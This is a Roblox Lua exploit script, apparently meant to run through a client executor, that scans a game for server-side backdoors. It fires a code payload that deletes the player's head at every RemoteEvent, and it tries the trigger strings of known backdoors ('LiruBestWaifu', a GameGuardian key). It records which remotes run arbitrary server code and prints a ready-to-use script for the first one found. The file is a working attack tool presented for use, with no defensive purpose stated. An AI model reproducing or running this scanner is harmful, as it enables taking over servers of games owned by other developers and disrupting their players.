-- Backdoor Finder Script 
-- og by Indica

local findGG = true -- Exodus ServerSide

local FindSkidded = true -- Finds that one skidded

local Target = game -- Second Wave Target

local scanFolders = true -- If you want to scan the folders within a target

local scanAll = true -- Continue scanning after finding a vulnerable remote

local WaitTime = 0 -- Reccomended wait time is 2

local hasSynapse = false -- Enables Synapse functions to save the found remotes to a text file

local generateScript = true -- Generates a script to be used for the first found vulnerable remote

local scanFullTarget = true -- Scans everything. Everything.

local BlackList = {  } -- Items to exclude from the scanning process "item1", "item2", "item3" etc
---------------------------------------------------------------------------
---------------------------------------------------------------------------
local LocalPlayer = game:GetService("Players").LocalPlayer
local Script = [[game:GetService("Players").]]..tostring(LocalPlayer.Name)..[[.Character.Head:Remove()]]
local playerDied = false
local foundBackdoor = false
local vulnCount = 0;
local foundItems = {}
local toWrite = ""
tempList = {}
print("------------------------------------------------------------------")
print("IMPORTANT : Do not die whilst using this.")
print("------------------------------------------------------------------")
print("Backdoor Scanner v2 -- Edit by A Sad Cat")
print("------------------------------------------------------------------")

for _,mem in pairs(BlackList) do -- testing purposes
	table.insert(tempList, mem)
end

function writeFile(text)
	Synapse:WriteFile(tostring(game.PlaceId).." -- Backdoor Finder.txt", text)
end

function inTable(table, element)
	for i,v in pairs(table) do
		if v == element then
			return true
		end
	end
	return false
end

function scanPlayer()
	if not LocalPlayer.Character:FindFirstChild("Head") then
		playerDied = true
	end
end

function showHint(text)
game.StarterGui:SetCore("SendNotification", {
	Title = "Triscut's Backdoor Hacker"; 
	Text = text; 
})
end

function waitForPlayer()
	if LocalPlayer.Character:FindFirstChild("Head") then
		return true
	else
		return false
	end
end

showHint("Now hacking...")
wait(1)

function scanTargAll()
showHint("Third Wave Started.")
	for _,v in pairs(game:GetDescendants()) do
		if v:IsA('RemoteEvent') then
			if not inTable(tempList, tostring(v.Name)) then
				print("Testing Remote : "..v.Name)
				v:FireServer(Script)
				wait(WaitTime)
				scanPlayer()
					if playerDied == true then
						print("Found Backdoor RemoteEvent : "..v.Name)
						showHint("Found Backdoor RemoteEvent : "..v.Name)
						vulnCount = vulnCount + 1;
						table.insert(foundItems, v.Name)			
						while true do
							if waitForPlayer then
								break
							end
						wait(0.2)
					end
					playerDied = false;
				end
			else
				print(v.Name.." is Blacklisted - Not Scanning")
			end
		end
	end
end



function waveDOS()
showHint("Second Wave Started.")
	for _,v in pairs(game:GetDescendants()) do
		if v:IsA('RemoteEvent') then
			if not inTable(tempList, tostring(v.Name)) then
				print("Testing Remote : "..v.Name)
				v:FireServer("LiruBestWaifu",Script)
				wait(WaitTime)
				scanPlayer()
					if playerDied == true then
						print("Found Backdoor RemoteEvent : "..v.Name)
						showHint("Found Backdoor RemoteEvent : "..v.Name)
						vulnCount = vulnCount + 1;
						table.insert(foundItems, v.Name)			
						while true do
							if waitForPlayer then
								break
							end
						wait(0.2)
					end
					playerDied = false;
				end
			else
				print(v.Name.." is Blacklisted - Not Scanning")
			end
		end
	end
end




function StandardScan()
showHint("First Wave Started.")
	for i,v in pairs(Target:GetChildren()) do
		if v:IsA("RemoteEvent") then
			if not inTable(tempList, tostring(v.Name)) then
				print("Testing Remote : "..v.Name)
				v:FireServer(Script)
				wait(WaitTime)
				scanPlayer()
					if playerDied == true then
						print("Found Backdoor RemoteEvent : "..v.Name)
						showHint("Found Backdoor RemoteEvent : "..v.Name)
						vulnCount = vulnCount + 1;
						table.insert(foundItems, v.Name)			
						while true do
							if waitForPlayer then
								break
						end
						wait(0.2)
					end			
					if scanAll == false then
						foundBackdoor = true
						break
					end
					playerDied = false;
				end
			else
				print(v.Name.." is Blacklisted - Not Scanning")
			end	
		elseif scanFolders == true then
			if v:IsA("Folder") or v:IsA("Model") then
				for d,c in pairs(v:GetChildren()) do
					if c:IsA("RemoteEvent") then
						if not inTable(tempList, tostring(c.Name)) then
							print("Testing Remote : "..c.Name)
							c:FireServer(Script)
							wait(WaitTime)
							scanPlayer()
								if playerDied == true then
									print("Found Backdoor RemoteEvent : "..v.Name.." >> "..c.Name)
									showHint("Found Backdoor RemoteEvent : "..v.Name.." >> "..c.Name)
									vulnCount = vulnCount + 1;
									table.insert(foundItems, v.Name)
									while true do
										if waitForPlayer then
											break
										end
										wait(0.2)
								end
								if scanAll == false then
									foundBackdoor = true
									break
								end
								playerDied = false;
							end
						else	
							print(c.Name.." is Blacklisted - Not Scanning")
						end
					end
				end
			end
		end
	end
end


function GG()
showHint("GameGaurdian Wave Started.")
	for _,v in pairs(game:GetDescendants()) do
		if v:IsA('RemoteEvent') then
			if not inTable(tempList, tostring(v.Name)) then
				print("Testing Remote : "..v.Name)
				v:FireServer('$#4#!34D@fasd@$@#@', 1176949464, game:GetService'Players'.LocalPlayer.Name)
				wait(WaitTime)
				scanPlayer()
					if playerDied == true then
						print("Found Backdoor RemoteEvent : "..v.Name)
						showHint("Found Backdoor RemoteEvent : "..v.Name)
						vulnCount = vulnCount + 1;
						table.insert(foundItems, v.Name)			
						while true do
							if waitForPlayer then
								break
						end
						wait(0.2)
					end			
					if scanAll == false then
						foundBackdoor = true
						break
					end
					playerDied = false;
				end
			else
				print(v.Name.." is Blacklisted - Not Scanning")
			end	
		elseif scanFolders == true then
			if v:IsA("Folder") or v:IsA("Model") then
				for d,c in pairs(v:GetChildren()) do
					if c:IsA("RemoteEvent") then
						if not inTable(tempList, tostring(c.Name)) then
							print("Testing Remote : "..c.Name)
							c:FireServer(Script)
							wait(WaitTime)
							scanPlayer()
								if playerDied == true then
									print("Found Backdoor RemoteEvent : "..v.Name.." >> "..c.Name)
									showHint("Found Backdoor RemoteEvent : "..v.Name.." >> "..c.Name)
									vulnCount = vulnCount + 1;
									table.insert(foundItems, v.Name)
									while true do
										if waitForPlayer then
											break
										end
										wait(0.2)
								end
								if scanAll == false then
									foundBackdoor = true
									break
								end
								playerDied = false;
							end
						else	
							print(c.Name.." is Blacklisted - Not Scanning")
						end
					end
				end
			end
		end
	end
end



StandardScan()
wait(5)
waveDOS()
wait(5)
scanTargAll()
wait(5)
if findGG == true then
GG()
end



if vulnCount >= 1 then
	foundBackdoor = true
end
print("------------------------------------------------------------------")
if foundBackdoor == false then
	print("Couldn't find a backdoor in the target :(")
	showHint("Mission Failed We Will Get Em Next Time.")
else
	print("Found "..tostring(vulnCount).." Items.")
	showHint("Found "..tostring(vulnCount).." Items.")
	showHint("Please look at the ROBLOX developer console (F9)")
	if hasSynapse then
		toWrite = "--Generated with Indica Backdoor Scanner--\n"
	end
	
	for i,v in pairs (foundItems) do
		print("Vulnerable Remote : "..tostring(v))
		showHint("Vulnerable Remote : "..tostring(v))
		
		if hasSynapse then
			toWrite = toWrite.."Vulnerable Remote : "..tostring(v).."\n"
			writeFile(toWrite)			
		end
	end
	
	print("------------------------------------------------------------------")
	print("----------------------------SCRIPT----------------------------")
	
	if generateScript then
		genRemote = foundItems[1]
		line1 = [[local Backdoor = game:GetService("]]..Target.Name..[[").]]..genRemote
		line2 = [[local Script = ""]]
		line3 = [[Backdoor:FireServer(Script)]]
		print(line1)
		print(line2)
		print(line3)
	end	
end
print("------------------------------------------------------------------")